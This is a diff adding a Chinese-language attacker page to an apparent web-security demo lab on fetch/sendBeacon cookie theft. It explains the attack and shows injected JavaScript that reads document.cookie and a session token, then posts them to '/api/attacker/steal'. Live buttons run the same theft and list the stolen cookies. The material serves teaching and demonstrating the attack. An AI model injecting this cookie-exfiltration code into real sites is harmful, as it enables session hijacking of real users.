@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>攻击者 - Case3 Fetch/Beacon 劫持</title>
+    <link rel="stylesheet" href="/styles.css" />
+    <style>
+      .attacker-header {
+        background: linear-gradient(135deg, #dc2626, #991b1b);
+        color: white;
+        padding: 1.5rem 1rem;
+        text-align: center;
+      }
+      .attacker-header h1 {
+        margin: 0;
+        font-size: 1.8rem;
+      }
+      .code-block {
+        background: #1e293b;
+        color: #e2e8f0;
+        padding: 1.5rem;
+        border-radius: 0.8rem;
+        font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
+        font-size: 0.9rem;
+        line-height: 1.6;
+        overflow-x: auto;
+        white-space: pre-wrap;
+        word-break: break-word;
+      }
+      .code-block .comment {
+        color: #94a3b8;
+      }
+      .code-block .string {
+        color: #86efac;
+      }
+      .code-block .keyword {
+        color: #fbbf24;
+      }
+    </style>
+  </head>
+  <body>
+    <header class="attacker-header">
+      <h1>😈 Case3 攻击：Fetch/Beacon Cookie 窃取</h1>
+    </header>
+    <main class="container">
+      <section class="section">
+        <h2>🎯 攻击原理</h2>
+        <p>
+          受害者在 case3-shop.html 页面中使用 fetch API 加载数据或使用 sendBeacon 发送数据时，
+          如果目标 URL 可以被攻击者控制，攻击者可以构造一个恶意 URL，
+          将请求发送到自己的服务器，从而在请求中携带受害者的 cookie。
+        </p>
+        <p><strong>攻击流程：</strong></p>
+        <ol>
+          <li>攻击者准备一个恶意服务器端点（/api/attacker/steal），用于接收 cookie</li>
+          <li>攻击者构造恶意 URL，指向自己的服务器端点</li>
+          <li>攻击者需要修改 case3-shop.html 中的 fetch 或 sendBeacon 的目标 URL（实际攻击中可能通过 XSS 或其他方式）</li>
+          <li>当受害者访问 case3-shop.html 并触发 fetch 或 sendBeacon 时，请求会发送到攻击者服务器</li>
+          <li>攻击者服务器从请求头中提取 cookie（如果设置了 credentials: 'include'）</li>
+          <li>攻击者在后台查看窃取的 cookie</li>
+        </ol>
+        <p class="muted">
+          <strong>注意：</strong>由于同源策略，fetch 默认不会发送 cookie 到不同域。
+          但如果受害者页面设置了 <code>credentials: 'include'</code> 或服务器设置了 CORS 允许携带 cookie，
+          攻击者就可以获取到 cookie。
+        </p>
+      </section>
+
+      <section class="section">
+        <h2>💻 攻击代码展示</h2>
+        <h3>方式一：通过修改 fetch URL</h3>
+        <div class="code-block">
+<span class="comment">// 在受害者页面（case3-shop.html）中，如果 fetch 的 URL 可以被控制：</span>
+<br>
+<span class="comment">// 原始代码（受害者）：</span>
+<span class="keyword">fetch</span>(<span class="string">'/api/products'</span>)
+  .then(res => res.json())
+  .then(data => { <span class="comment">/* 处理数据 */</span> });
+<br>
+<span class="comment">// 攻击者修改后的代码（通过 XSS 或其他方式注入）：</span>
+<span class="keyword">const</span> attackerUrl = <span class="string">'/api/attacker/steal?cookie='</span> + 
+  <span class="keyword">encodeURIComponent</span>(<span class="string">document.cookie</span>);
+<br>
+<span class="keyword">fetch</span>(attackerUrl, {
+  method: <span class="string">'POST'</span>,
+  headers: { <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span> },
+  credentials: <span class="string">'include'</span>, <span class="comment">// 携带 cookie</span>
+  body: <span class="keyword">JSON</span>.stringify({
+    caseId: <span class="string">'case3'</span>,
+    attackType: <span class="string">'fetch_hijack'</span>,
+    cookies: <span class="string">document.cookie</span>,
+    case3Token: <span class="string">document.cookie</span>
+      .split(<span class="string">'; '</span>)
+      .find(c => c.startsWith(<span class="string">'case3Token='</span>))
+      ?.split(<span class="string">'='</span>)[1]
+  })
+});
+        </div>
+
+        <h3 style="margin-top: 2rem;">方式二：通过修改 sendBeacon URL</h3>
+        <div class="code-block">
+<span class="comment">// 在受害者页面关闭时，如果 sendBeacon 的 URL 可以被控制：</span>
+<br>
+<span class="comment">// 原始代码（受害者）：</span>
+<span class="keyword">window</span>.addEventListener(<span class="string">'beforeunload'</span>, () => {
+  <span class="keyword">navigator</span>.sendBeacon(<span class="string">'/api/beacon'</span>, <span class="keyword">JSON</span>.stringify(data));
+});
+<br>
+<span class="comment">// 攻击者修改后的代码：</span>
+<span class="keyword">window</span>.addEventListener(<span class="string">'beforeunload'</span>, () => {
+  <span class="keyword">const</span> payload = <span class="keyword">JSON</span>.stringify({
+    caseId: <span class="string">'case3'</span>,
+    attackType: <span class="string">'beacon_hijack'</span>,
+    cookies: <span class="string">document.cookie</span>,
+    case3Token: <span class="string">document.cookie</span>
+      .split(<span class="string">'; '</span>)
+      .find(c => c.startsWith(<span class="string">'case3Token='</span>))
+      ?.split(<span class="string">'='</span>)[1],
+    originalData: data
+  });
+  <span class="keyword">navigator</span>.sendBeacon(<span class="string">'/api/attacker/steal'</span>, payload);
+});
+        </div>
+      </section>
+
+      <section class="section">
+        <h2>🔗 恶意 URL 构造</h2>
+        <p>攻击者需要构造以下 URL，作为 fetch 或 sendBeacon 的目标：</p>
+        <div class="code-block">
+<span class="string">/api/attacker/steal</span>
+<br>
+<span class="comment">// 或者通过 URL 参数传递 cookie（如果 URL 长度允许）：</span>
+<span class="string">/api/attacker/steal?cookie=...</span>
+        </div>
+      </section>
+
+      <section class="section">
+        <h2>🧪 模拟攻击测试</h2>
+        <p>点击下面的按钮，模拟在受害者页面中执行攻击代码：</p>
+        <button onclick="simulateFetchAttack()">模拟 Fetch 攻击</button>
+        <button onclick="simulateBeaconAttack()">模拟 Beacon 攻击</button>
+        <div id="attackLog" class="log-panel" style="margin-top: 1rem;">等待攻击触发...</div>
+        <button onclick="checkStolenCookies('case3')" style="margin-top: 1rem;">查看窃取的 Cookie</button>
+      </section>
+    </main>
+    <script>
+      const logPanel = document.getElementById('attackLog');
+      const appendLog = (msg) => {
+        const timestamp = new Date().toLocaleTimeString();
+        logPanel.textContent = `[${timestamp}] ${msg}\n${logPanel.textContent}`.slice(0, 2000);
+      };
+
+      async function simulateFetchAttack() {
+        appendLog('⚠️ 开始模拟 Fetch 攻击...');
+        
+        // 读取 cookie
+        const cookies = document.cookie;
+        const case3Token = cookies
+          .split('; ')
+          .find(c => c.startsWith('case3Token='))
+          ?.split('=')[1];
+
+        appendLog(`读取到 Cookie: ${cookies || '(无)'}`);
+
+        try {
+          const response = await fetch('/api/attacker/steal', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            credentials: 'include', // 携带 cookie
+            body: JSON.stringify({
+              caseId: 'case3',
+              attackType: 'fetch_hijack',
+              cookies: cookies,
+              case3Token: case3Token,
+              referer: document.referrer,
+              userAgent: navigator.userAgent,
+              url: window.location.href
+            })
+          });
+
+          const data = await response.json();
+          if (data.success) {
+            appendLog('✅ Fetch 攻击成功，Cookie 已发送到攻击者服务器！');
+          }
+        } catch (err) {
+          appendLog(`❌ Fetch 攻击失败: ${err.message}`);
+        }
+      }
+
+      async function simulateBeaconAttack() {
+        appendLog('⚠️ 开始模拟 Beacon 攻击...');
+        
+        // 读取 cookie
+        const cookies = document.cookie;
+        const case3Token = cookies
+          .split('; ')
+          .find(c => c.startsWith('case3Token='))
+          ?.split('=')[1];
+
+        appendLog(`读取到 Cookie: ${cookies || '(无)'}`);
+
+        const payload = JSON.stringify({
+          caseId: 'case3',
+          attackType: 'beacon_hijack',
+          cookies: cookies,
+          case3Token: case3Token,
+          referer: document.referrer,
+          userAgent: navigator.userAgent,
+          url: window.location.href
+        });
+
+        const sent = navigator.sendBeacon('/api/attacker/steal', payload);
+        if (sent) {
+          appendLog('✅ Beacon 攻击成功，Cookie 已发送到攻击者服务器！');
+        } else {
+          appendLog('❌ Beacon 发送失败');
+        }
+      }
+
+      async function checkStolenCookies(caseId) {
+        try {
+          const res = await fetch('/api/attacker/stolen');
+          const data = await res.json();
+          const filtered = data.cookies.filter(c => c.caseId === caseId);
+          if (filtered.length === 0) {
+            logPanel.textContent = '暂无此 Case 的 Cookie 数据\n' + logPanel.textContent;
+          } else {
+            logPanel.textContent = `找到 ${filtered.length} 条 Cookie 记录：\n${JSON.stringify(filtered, null, 2)}\n\n` + logPanel.textContent;
+          }
+        } catch (err) {
+          logPanel.textContent = `查询失败: ${err.message}\n` + logPanel.textContent;
+        }
+      }
+    </script>
+  </body>
+</html>
+
